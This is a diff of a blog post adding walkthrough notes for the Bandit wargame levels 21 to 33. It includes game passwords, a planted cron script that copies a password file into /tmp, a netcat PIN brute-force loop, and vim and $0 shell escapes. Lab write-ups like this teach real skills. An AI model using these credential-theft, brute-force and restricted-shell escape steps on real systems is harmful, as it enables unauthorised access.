@@ -2,7 +2,7 @@
 layout: post
 title: Bandit Solutions!
 ---
-*This is documentation for completing bandit levels 0-20*  
+*This is documentation for completing all bandit levels*  
 Note: The level names come from the first part of the level name, for example, 0-1 would be level 0.  
 ***Level 0***  
 ssh bandit0@bandit.labs.overthewire.org -p 2220  
@@ -172,3 +172,154 @@ ssh bandit20@bandit.labs.overthewire.org -p 2220
 ls -ah  
 echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -l localhost 12345 &  
 ./suconnect 12345  
+***Level 21***  
+ssh bandit21@bandit.labs.overthewire.org -p 2220  
+cd /etc/cron.d/  
+ls  
+cat cronjob_bandit22  
+cat /usr/bin/cronjob_bandit22.sh  
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv  
+exit    
+***Level 22***  
+ssh bandit22@bandit.labs.overthewire.org -p 2220  
+cd /etc/cron.d  
+ls  
+cat /usr/bin/cronjob_bandit23.sh  
+/usr/bin/cronjob_bandit23.sh  
+cat /tmp/8169b67bd894ddbb4412f91573b38db3  
+*Realized above folder was wrong*  
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1  
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349  
+exit  
+***Level 23***  
+ssh bandit23@bandit.labs.overthewire.org -p 2220  
+cat /etc/cron.d/cronjob_bandit24  
+cat /usr/bin/cronjob_bandit24.sh  
+mkdir -p /tmp/123456  
+cd /tmp/123456  
+touch script.sh  
+nano script.sh  
+*Below is the script I used*  
+#!/bin/bash  
+cat /etc/bandit_pass/bandit24 > /tmp/1234567890/password  
+*exit the script*  
+touch password  
+chmod 777 -R /tmp/123456  
+cp script.sh /var/spool/bandit24/foo  
+cat password  
+exit  
+#Level 24  
+ssh bandit24@bandit.labs.overthewire.org -p 2220  
+mkdir -p /tmp/123456  
+cd /tmp/123456  
+touch script.sh  
+nano script.sh  
+*Below is the script I used*  
+#!/bin/bash  
+pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  
+for i in {0000..9999}  
+do  
+	echo $i >> out.txt  
+	echo $pass $i | nc localhost 30002 >> out.txt &  
+	pid=$!  
+	sleep 1  
+	kill $pid  
+	echo "" >> out.txt  
+done   
+*Script done*  
+touch out.txt  
+./script.sh  
+less out.txt  
+#Ran Overnight, was taking a long time to finish  
+#Level 25  
+ssh bandit25@bandit.labs.overthewire.org -p 2220  
+ssh -i bandit26.sshkey bandit26@localhost -p 2220 *Doesn't work right yet*   
+cat /etc/passwd | grep bandit26  
+cat /usr/bin/showtext  
+*Make window super small*  
+ssh -i bandit26.sshkey bandit26@localhost -p 2220  
+*press v to open vim*  
+:e /etc/bandit_pass/bandit26  
+:set shell=/bin/bash  
+:shell  
+***Level 26***  
+ls  
+./bandit27-do  
+./bandit27-do whoami  
+./bandit27-do cat /etc/bandit_pass/bandit27  
+exit  
+***Level 27***  
+ssh bandit27@bandit.labs.overthewire.org -p 2220  
+mktemp -d  
+cd /tmp/tmp.9hSckLflKM  
+git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo  
+cd repo  
+ls  
+cat README  
+exit  
+***Level 28***  
+ssh bandit28@bandit.labs.overthewire.org -p 2220  
+mktemp -d  
+cd /tmp/tmp.7f1Ts0Xb9j  
+git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo  
+cd repo  
+ls  
+cat README.md  
+git log  
+git checkout 3621de   
+*Note: this doesn't need full commit name, just first 6 digits*  
+cat README.md  
+exit  
+***Level 29***  
+ssh bandit29@bandit.labs.overthewire.org -p 2220  
+mktemp -d  
+cd /tmp/tmp.D9MqQMiuLi  
+git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo  
+cd repo  
+ls  
+cat README.md  
+git log  
+git branch -a  
+git checkout remotes/origin/dev  
+ls  
+cat README.md  
+exit  
+***Level 30***  
+ssh bandit30@bandit.labs.overthewire.org -p 2220  
+mktemp -d  
+cd /tmp/tmp.4pwmlbKRRO  
+git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo  
+cd repo  
+ls  
+cat README.md  
+git log  
+git branch -a  
+git tag  
+git show secret  
+exit  
+***Level 31***  
+ssh bandit31@bandit.labs.overthewire.org -p 2220  
+mktemp -d  
+cd /tmp/tmp.Xm3GJTqL6J  
+git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo  
+cd repo  
+ls  
+cat README.md  
+echo "May I come in?" > key.txt  
+ls -ah  
+cat .gitignore  
+rm .gitignore  
+ls -ah  
+git add .  
+git commit -m "Added key.txt"  
+git push origin master  
+exit  
+***Level 32***
+ssh bandit32@bandit.labs.overthewire.org -p 2220  
+$0  
+ls -lah  
+whoami  
+cat /etc/bandit_pass/bandit33  
+***THE END***
+***Level 33***
+*At this moment, level 33->34 does not exist yet.*
